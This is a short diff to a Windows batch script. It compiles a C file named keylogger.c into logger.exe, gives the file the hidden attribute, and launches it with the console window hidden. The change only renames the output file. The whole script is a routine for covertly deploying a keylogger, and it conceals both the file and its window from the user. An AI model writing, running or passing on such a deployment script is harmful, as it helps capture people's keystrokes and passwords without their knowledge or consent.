@@ -1,6 +1,6 @@
 :: Compile the C source file
-gcc ../src/keylogger.c
+gcc -o logger.exe ../src/keylogger.c
 :: Hides the executable file
-attrib a.exe +h
+attrib logger.exe +h
 :: Start the program while hiding console
-start /d "./" a.exe
+start /d "./" logger.exe
